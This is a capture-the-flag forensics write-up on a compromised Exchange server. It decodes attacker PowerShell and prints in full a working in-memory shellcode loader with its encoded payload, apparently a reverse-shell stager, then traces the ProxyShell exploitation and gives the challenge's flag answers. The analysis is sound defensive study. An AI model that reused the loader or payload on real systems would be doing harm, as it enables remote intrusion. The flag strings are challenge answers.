0WDfxthfZVRi1WveRevs+udz3IVxrNO1iNDV9tPNVS1Xte0rsxaap6nVLjxoX+6ExhLXVnUm31iLqe7v7TvW3UR+jiKmWrqoGgUwNVWfTqtbG7LM1OreGurLdDZXtRn+obnTc3ayy77B9ceFXl41BdWSbtOMEGsS76zZWuHsCe6EzUu6X1ZHAr6XT6p5OiDNo1hhZVGtD3PqoaSZGXYHhVw3ODDbOrQVr1t1gCTGZ/qXlTxitOyuwO/ZViA7OF5h42TVBR1sTvBqeTISt7kYJu1tFxBl2LyG2ehaDyqk5qUJ8aqdlN2nbNid1Dxla9cT99AEoORtiys/q88Ii8kQBf/+uEITnj8+Y+Vp/6jtxEjgEGAutJ68eBouNrJcMGBYaspy+SFYopohAE4c2n6ecSghzRStLuw600UNzE712aKZRvfRXkp4ES8cmly9dXU0hSsjhfa/SQ9TnQVnZnikKdCZlqzTSVH37yZos2slgqiw6WwrMwTJJLYMxvJRk+dcjBe8XDjX0daxegw18r6DiQQ0+1CABnsYYeQ5ddq4nJhyRA8hqcPCZeLkIgoD6KfoqFbho68+fCQXa/7WMyepoAB/v3xhzXPuH3TexSCkfsPlp+ceFZ33oF0IwdjAHSRtaAkGHp8rLSGRp8vwB2IckWGZDvOBv1vz0Gl6FaUv6C4yyAlo7DAAA
```
And after decoding that....
I got nothing interesting ?
Weird...
Or not !
In the code, we can see :
```powershell
New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(
```
So this is probably a gzip file.
Yes, this was!
Here's the decoded file:
```powershell
function lzRi {
        Param ($pOiGr, $yA3b)
        $gP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $gP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($gP.GetMethod('GetModuleHandle')).Invoke($null, @($pOiGr)))), $yA3b))
}

function dTQV {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $h3at,
                [Parameter(Position = 1)] [Type] $jot2r = [Void]
        )

        $oKKj2 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $oKKj2.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $h3at).SetImplementationFlags('Runtime, Managed')
        $oKKj2.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $jot2r, $h3at).SetImplementationFlags('Runtime, Managed')

        return $oKKj2.CreateType()
}

[Byte[]]$zL = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGEiLUiBWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAE2QEp46zUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=")
[Uint32]$bpd = 0
$hm5v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lzRi kernel32.dll VirtualAlloc), (dTQV @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zL.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($zL, 0, $hm5v, $zL.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lzRi kernel32.dll VirtualProtect), (dTQV @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hm5v, [Uint32]$zL.Length, 0x10, [Ref]$bpd)) -eq $true) {
        $nM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lzRi kernel32.dll CreateThread), (dTQV @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$hm5v,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lzRi kernel32.dll WaitForSingleObject), (dTQV @([IntPtr], [Int32]))).Invoke($nM,0xffffffff) | Out-Null
```

Nothing inside the file base64 string tho, it looks like a binary.
After deconding the second one, i see that they are the same except for variable names (kinda).

It basicly injects things in kernel memory... That's probably a meterpreter or a reverse shell.

I'll try to decode the 3rd and 4th file too, just in case, because the powershell seems a bit different.
Nevermind, it's just the same but wrapped around these lines:
```powershell
if([IntPtr]::Size -eq 4){
    $b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'
}
else{
    $b='powershell.exe'
};
$s=New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='INNER';
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);
```


So, we know one thing now:
```
The computer `exchange` has been pwned.
07/04 17:36:56, and 07/04 at 17:44, these computers were infected and running commands.
```

Also, these are the only warning+ events on the "exchange" computer...

At the same time period, i found this event:

![](_attachments/Pasted%20image%2020240406203821.png)

That looks like it creates a files named "aspx" in the exchange server.
Since we're logged in as "exchange", that looks good !

After some research, i found this:
https://www.logpoint.com/fr/blog/vulnerabilite-cve-2020-0688-microsoft-exchange-server-rce

It says (in french):
```
Vous trouverez ci-dessous quelques chemins pour inspecter la création d’un fichier suspect afin de rechercher la suppression des shells web :

- %ProgramFiles%\Microsoft\Exchange Server\<\version>\ClientAccess\Owa\Auth
- %ProgramFiles%\Microsoft\Exchange Server\<\version>\FrontEnd\HttpProxy\owa\auth
- \Inetpub\wwwroot\
```

That's exactly our path where our weird aspx file is !

![](_attachments/Pasted%20image%2020240406204151.png)

2 seconds later, we can see that a cmd has ben run...

For the first flag, we have to find:
- Name of the vulnerability (seems like CVE-2020-0688)
- Timestamp of first vulnerability exploit attempt

I tried
- `FCSC{CVE-2020-0688|2022-07-04T15:36}`
- `FCSC{CVE-2020-0688|2022-07-04T15:37}`
That didn't work.

Since i'm pretty convinced that my timestamps are correct, i'll search for others CVEs.
After searching for strings, i found this website:
https://www.cert.ssi.gouv.fr/alerte/CERTFR-2022-ALE-008/
That's the ANSSI website... Might be it ?
I tried both CVEs with both timestamps, didn't work (CVE-2022-41040 and CVE-2022-41082).

I researched for ways to detect these vulns (also know as 'proxy-not-shell').
I found this article:
https://www.logpoint.com/fr/blog/proxynotshell-detection-de-lexploitation-des-vulnerabilites-zero-day-dans-le-serveur-exchange/

And especially this field:

![](_attachments/Pasted%20image%2020240406210720.png)

That asks to look for child processes of w3wp.exe: csc.exe and WerFaulte.exe
The thing is...

![](_attachments/Pasted%20image%2020240406210755.png)

There is one !

Also, remember our powershell script from before ?

![](_attachments/Pasted%20image%2020240406210915.png)

Ohh that looks good !

So, now i'm 99% sure about the CVE: `CVE-2022-41082`, that "allows remote code execution if the user has access to powershell".

Now i just need to find the timestamp.

I searched for "w3wp.exe", and i found this one

![](_attachments/Pasted%20image%2020240406211145.png)

That happenned at 17.33... let's try ?

This one didn't work either:
`FCSC{CVE-2022-41082|2022-07-04T15:33}`

Yeah make sense, this is just loading a mailbox or something.

Also, there is only 30 attempts for the flag, and i already burned 7, must be cautious...

They're asking about the vulnerability name, could it be ProxyNotShell?
`FCSC{ProxyNotShell|2022-07-04T15:37}`
and 
`FCSC{ProxyNotShell|2022-07-04T15:36}`
didn't work...

And after some research, i found that this was ProxyShell !
Why ? Because ProxyNotshell wasn't even existing at this timestamp, so i looked for his old brother... and it worked! 

Final flag:
FCSC{ProxyShell|2022-07-04T15:36}

